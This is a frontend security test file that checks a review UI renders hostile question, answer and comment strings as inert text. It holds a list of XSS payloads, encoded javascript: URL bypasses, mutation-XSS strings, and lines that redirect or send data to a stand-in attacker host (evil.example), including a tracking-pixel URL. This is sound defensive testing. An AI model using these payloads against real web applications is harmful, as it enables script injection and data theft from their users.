// @vitest-environment jsdom
// T4 security/edge QA for the A/B review UI: hostile question/answer/comment/error strings must render
// as inert text in every place the review feature shows model or user content.
import {cleanup,fireEvent,render,screen,waitFor,within} from '@testing-library/react';
import {afterEach,beforeEach,expect,test,vi} from 'vitest';
import ReviewOverview from './ReviewOverview';
import ReviewPair from './ReviewPair';
import TrainingBatchDetail from './TrainingBatchDetail';
import TrainingWorkspace from './TrainingWorkspace';
import {ReadOnlyItemDialog} from './ItemDetail';
import Markdown from '../../components/Markdown';
import type {Assignment} from '../../reviewTypes';

declare global { var __xss: number | undefined; }
beforeEach(()=>{globalThis.__xss=0;vi.spyOn(window,'alert').mockImplementation(()=>{globalThis.__xss=(globalThis.__xss||0)+1;});});
afterEach(()=>{cleanup();vi.restoreAllMocks();});

const PAYLOADS:string[]=[
 '<script>globalThis.__xss=1;alert(1)</script>',
 '<img src=x onerror="globalThis.__xss=1;alert(1)">',
 '[click me](javascript:globalThis.__xss=1)',
 '<a href="javascript:alert(1)">raw anchor</a>',
 '<iframe src="javascript:alert(1)"></iframe>',
 '<svg onload="alert(1)"><circle/></svg>',
 '<details open ontoggle="alert(1)"><summary>x</summary></details>',
 '<style>@import "http://evil.example/x.css";body{display:none}</style>',
 '<form action="http://evil.example"><input name=q><button>go</button></form>',
 '<meta http-equiv="refresh" content="0;url=http://evil.example"><base href="http://evil.example/">',
 '[a](java&#9;script:alert(1)) [b](<javascript:alert(1)>) [c](JaVaScRiPt:alert(1)) [d](data:text/html,<script>alert(1)</script>)',
 '![x](javascript:alert(1)) ![y](data:image/svg+xml,<svg onload=alert(1)>)',
 '[ref]\n\n[ref]: javascript:alert(1)',
 '```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n```',
 'rtl ‮evil‬ zwsp​ iso⁦x⁩ bell\u0007 esc\u001b[31m nul\u0000',
 '# H1\n<b>raw html</b> **bold** `code` <u>under</u>',
 'x'.repeat(60000),
 '| a | b |\n|---|---|\n| <script>alert(1)</script> | [l](javascript:alert(1)) |',
 '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
 '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
];

const DANGEROUS_SCHEME=/^[\s\u0000-\u001f]*(javascript|data|vbscript):/i;
/** Fails when the rendered DOM contains anything that could execute or load active content. */
function assertInert(root:ParentNode=document.body){
 for(const el of Array.from(root.querySelectorAll('*'))){
  const tag=el.tagName.toLowerCase();
  expect(['script','iframe','object','embed','style','meta','base','link','frame','frameset','applet','noscript'],`<${tag}> element rendered`).not.toContain(tag);
  if(tag==='svg') expect(el.getAttribute('class')||'',`foreign <svg> (not an icon)`).toMatch(/lucide|spin|icon/i);
  if(tag==='form') expect(el.hasAttribute('action'),'form with action').toBe(false);
  for(const attr of Array.from(el.attributes)){
   expect(attr.name.toLowerCase().startsWith('on'),`inline handler ${attr.name} on <${tag}>`).toBe(false);
   if(['href','src','xlink:href','action','formaction','srcdoc','data'].includes(attr.name.toLowerCase()))
    expect(DANGEROUS_SCHEME.test(attr.value),`dangerous ${attr.name}=${attr.value}`).toBe(false);
  }
 }
 expect(globalThis.__xss).toBe(0);
}
function clickEveryLink(root:ParentNode=document.body){
 for(const a of Array.from(root.querySelectorAll('a'))) fireEvent.click(a);
 expect(globalThis.__xss).toBe(0);
}

const detailOf=(text:string)=>({id:'i1',question:text,source:'live',submitted_at:'2026-10-06T00:00:00Z',user_choice:'A',vote_count:1,complete:true,campaign_state:'open',
 user_winner_id:'c1',admin_choice:null,adjudication:null,batch_id:null,
 item:{id:'i1',campaign_id:'c',external_id:'e',source_group:'g',evidence:'',prompt_messages:[{role:'user',content:text}],
  candidates:[{id:'c1',text:text+' A',provenance:{}},{id:'c2',text:text+' B',provenance:{}}]},
 judgments:[{id:'j1',assignment_id:'a1',reviewer_id:text,decision:'left',winning_candidate_id:'c1',candidate_error_tags:{},comment:text,submitted_at:'2026-10-06T00:00:00Z'}]});

test.each(PAYLOADS.map((p,i)=>[i,p] as const))('admin detail dialog renders payload #%i inertly (question, both answers, reviewer id, comment)',async(_i,payload)=>{
 const api={overviewDetail:vi.fn().mockResolvedValue(detailOf(payload))};
 render(<ReadOnlyItemDialog api={api as never} id="i1" onClose={()=>{}}/>);
 const dlg=await screen.findByRole('dialog');
 await waitFor(()=>expect(within(dlg).getAllByText(/Câu trả lời/).length).toBeGreaterThan(1));
 fireEvent.click(within(dlg).getByText('Chi tiết'));
 assertInert();clickEveryLink();
});

const assignmentOf=(text:string):Assignment=>({id:'a1',item_id:'i',campaign_id:'c',campaign_title:text,external_id:text.slice(0,40),status:'pending',reviewer_id:'u',created_at:'x',
 prompt_messages:[{role:'user',content:text}],evidence:text,left:{text:text+' L'},right:{text:text+' R'},rubric:text,rubric_version:'security_qa_v1',judgment:null} as unknown as Assignment);

test.each(PAYLOADS.map((p,i)=>[i,p] as const))('user pair view renders payload #%i inertly (context, evidence, both answers, raw fold)',(_i,payload)=>{
 for(const showContext of [true,false]){
  const {unmount}=render(<ReviewPair assignment={assignmentOf(payload)} closed={false} saving={false} error={payload} onSubmit={()=>{}} showContext={showContext}/>);
  assertInert();clickEveryLink();
  // The raw-text fold is a <pre> with textContent only (no markup parsing).
  document.querySelectorAll('pre.review-metadata').forEach(pre=>expect(pre.children.length).toBe(0));
  unmount();
 }
});

test('submitted judgment (locked state) with hostile comment stays inert and read-only',()=>{
 const a=assignmentOf(PAYLOADS[1]);
 (a as any).judgment={id:'j',assignment_id:'a1',decision:'left',error_tags:{left:[],right:[]},comment:PAYLOADS[0],submitted_at:'x'};
 render(<ReviewPair assignment={a} closed={false} saving={false} error="" onSubmit={()=>{}}/>);
 assertInert();
 expect((screen.getByRole('textbox') as HTMLTextAreaElement).value).toBe(PAYLOADS[0]);
 expect((screen.getByRole('textbox') as HTMLTextAreaElement).disabled).toBe(true);
});

const row=(id:string,question:string)=>({id,question,user_choice:question,submitted_at:'2026-10-06',complete:true,campaign_state:'open',source:'live',vote_count:1,user_winner_id:'c1',admin_choice:'A',adjudication:null,batch_id:null});

test('queue/overview rows show hostile questions as plain text and open an inert detail dialog',async()=>{
 const rows=PAYLOADS.slice(0,10).map((p,i)=>row('r'+i,p));
 const api={overview:vi.fn(async()=>({items:rows,total:rows.length})),liveSettings:vi.fn().mockResolvedValue({sample_percent:10,cooldown_seconds:600}),
  eligibility:vi.fn().mockResolvedValue({valid_new_count:0,minimum_pairs:1000,eligible:false,blocked_reasons:[],snapshot_version:'s'}),batches:vi.fn().mockResolvedValue({items:[],total:0}),
  overviewDetail:vi.fn(async(id:string)=>detailOf(rows[Number(id.slice(1))].question)),bulkPreview:vi.fn()};
 render(<ReviewOverview api={api as never}/>);
 await screen.findAllByText('Xem và duyệt');
 assertInert();
 const spans=document.querySelectorAll('.ab-question');
 expect(spans.length).toBe(rows.length);
 // plain text, not parsed markup: textContent equals the raw payload, no child elements.
 spans.forEach((s,i)=>{expect(s.children.length).toBe(0);expect(s.textContent).toBe(rows[i].question);});
 for(const b of screen.getAllByText('Xem và duyệt').slice(0,3)){fireEvent.click(b);await screen.findByRole('dialog',{name:'Chi tiết phản hồi'});assertInert();fireEvent.click(screen.getByRole('button',{name:'Đóng'}));await waitFor(()=>expect(screen.queryByRole('dialog')).toBeNull());}
});

test('approved queue (Fine-tune tab) and batch snapshot items render hostile text inertly',async()=>{
 const rows=PAYLOADS.slice(0,6).map((p,i)=>row('q'+i,p));
 const api={overview:vi.fn(async()=>({items:rows,total:rows.length})),eligibility:vi.fn().mockResolvedValue({valid_new_count:0,minimum_pairs:1000,eligible:false,blocked_reasons:[PAYLOADS[0]],snapshot_version:'s'}),
  batches:vi.fn().mockResolvedValue({items:[{id:'b1',request_key:'k',purpose:'demo',created_at:'2026-10-06',sample_count:1,snapshot_sha256:'h',status:'failed',runs:[{id:'r1',status:'failed',created_at:'2026-10-06',error:PAYLOADS[1],remote:null}]}],total:1}),
  overviewDetail:vi.fn().mockResolvedValue(detailOf(PAYLOADS[2]))};
 render(<TrainingWorkspace api={api as never}/>);
 await screen.findAllByText('Xem');
 assertInert();
});

test('batch detail: hostile run error, event stage, snapshot question/answers and judgments stay inert',async()=>{
 const text=PAYLOADS.join('\n');
 const run={id:'run',status:'failed',created_at:'2026-10-06',error:PAYLOADS[1],remote:{status:'failed',error:PAYLOADS[0],progress:{stage:PAYLOADS[3]}}};
 const api={batch:vi.fn().mockResolvedValue({id:'b',status:'failed',sample_count:1,snapshot_sha256:'h',request_key:'k',purpose:'demo',created_at:'2026-10-06',runs:[run]}),
  batchItems:vi.fn().mockResolvedValue({items:[{...detailOf(text).item,judgments:detailOf(text).judgments,adjudication:{id:'a',outcome:'winner',winning_candidate_id:'c1',reason:PAYLOADS[0]}}],total:1}),
  runEvents:vi.fn().mockResolvedValue({items:[{seq:1,time:'2026-10-06T00:00:00Z',stage:PAYLOADS[1]}],next_seq:1})};
 render(<TrainingBatchDetail api={api as never} id="b" onClose={()=>{}}/>);
 await screen.findByRole('dialog');
 await waitFor(()=>expect(api.runEvents).toHaveBeenCalled());
 await waitFor(()=>expect(document.querySelector('.ab-snapshot')).not.toBeNull());
 document.querySelectorAll('details').forEach(d=>{(d as HTMLDetailsElement).open=true;});
 assertInert();clickEveryLink();
});

// --- Markdown component contract (single choke point used by chat and review) -----------------
test('Markdown component: no raw HTML is ever turned into elements and dangerous URLs are dropped',()=>{
 for(const p of PAYLOADS){const {unmount,container}=render(<Markdown>{p}</Markdown>);assertInert(container);clickEveryLink(container);unmount();}
});

test('Markdown component: link targets are never an executable scheme even with encoded control characters',()=>{
 const links=['[a](java&#9;script:alert(1))','[a](java&#x0A;script:alert(1))','[a](&#x6A;avascript:alert(1))','[a](%6Aavascript:alert(1))','[a]( javascript:alert(1))','[a]( javascript:alert(1))','[a](<  javascript:alert(1)>)','[a](javascript&colon;alert(1))'];
 for(const l of links){const {container,unmount}=render(<Markdown>{l}</Markdown>);
  for(const a of Array.from(container.querySelectorAll('a'))){
   const href=a.getAttribute('href')||'';
   // WHATWG URL parsing (same algorithm browsers use: strips tab/newline and leading C0/space before the scheme).
   const scheme=new URL(href,'http://app.local/').protocol;
   expect(['http:','https:','mailto:','tel:','file:'],`${l} -> ${href} -> ${scheme}`).toContain(scheme);
  }
  unmount();}
});

test('Markdown component: remote image markdown is rendered as an <img> to an arbitrary host (tracking pixel)',()=>{
 const {container}=render(<Markdown>{'![x](http://evil.example/p.png?d=secret)'}</Markdown>);
 const img=container.querySelector('img');
 // Recorded as T4-M8 (info): the component does not strip remote images, so an admin viewing a hostile sample
 // issues a GET to the attacker host. Not script execution.
 expect(img?.getAttribute('src')).toBe('http://evil.example/p.png?d=secret');
});

test('Markdown component: literal angle-bracket text inside prose is altered by the sanitizer pass (content fidelity)',()=>{
 const {container}=render(<Markdown>{'Use <script>alert(1)</script> to demo XSS and note a<b && c>d in code.'}</Markdown>);
 // Recorded as T4-M9: DOMPurify (ALLOWED_TAGS: []) removes the whole <script> text and the pseudo tag, so an admin
 // reading the sample cannot see the hostile payload that the user/model actually wrote.
 expect(container.textContent).not.toContain('<script>');
 expect(container.textContent).not.toContain('alert(1)');
});

test('harness self-check: the inertness assertions do fail on dangerous DOM (not vacuous)',()=>{
 for(const html of ['<img src=x onerror="alert(1)">','<a href="javascript:alert(1)">x</a>','<iframe></iframe>','<svg onload="1"></svg>','<a href="  &#1;javascript:alert(1)">x</a>']){
  const host=document.createElement('div');host.innerHTML=html;document.body.appendChild(host);
  expect(()=>assertInert(host),html).toThrow();
  host.remove();
 }
});
